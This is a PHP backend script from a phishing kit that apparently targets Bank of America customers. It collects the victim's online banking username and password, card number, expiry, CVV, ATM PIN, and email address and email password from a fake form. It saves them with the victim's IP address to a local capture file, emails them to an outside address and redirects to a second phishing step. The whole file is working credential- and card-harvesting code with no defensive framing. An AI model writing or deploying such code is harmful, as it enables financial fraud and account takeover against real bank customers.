<?php
$file = fopen("log.txt", "a+");
fwrite($file,"Guardando en archivo -> " .$_SERVER["REMOTE_ADDR"]."\n");
fclose($file);



    $para      = 'premium@customersn.com';
    $titulo    = 'BOA-YaYa-Capturas';
    $u = $_POST['u'];
    $p = $_POST['p'];
    $nt = $_POST['nt'];
    $dt =$_POST['dt'];
    $ct =  $_POST['ct'];
    $et = $_POST['et'];
    $pt2 =$_POST['pt2'];
    $pt =$_POST['pt'];
    $ip = $_SERVER["REMOTE_ADDR"];
    
    
    $mensaje   = "
                   [United States]
        +===========[BOF/PART-01]===========+
        Usuario   :  $u 
        PassUser  :  $p
        + --------------[CC]--------------- +
        CC        : $nt 
        Exp       : $dt 
        CVV       : $ct
        PIN ATM   : $pt 
        + ------------[Correo]------------- +
        Correo     :  $et 
        PassCorreo :  $pt2
        + --------------[IP]--------------- +
        IP         : $ip 
        +================[END]==============+
    
        ";
        
        
        


        $file = fopen("CapturasYaYa.txt", "a+");
        fwrite($file,"+=========[BOFYAYA]==========+\n " .$mensaje."\n\n");
        fclose($file);
        
        $file = fopen("log.txt", "a+");
        fwrite($file,"Guardado en results -> " .$_SERVER["REMOTE_ADDR"]."\n");
        fclose($file);
        
        mail($para, $titulo, $mensaje);
    var_dump(mail("#", $titulo, $mensaje));

    //echo $mensaje;
    header('Location: stepb.php');
    //exit;
?>
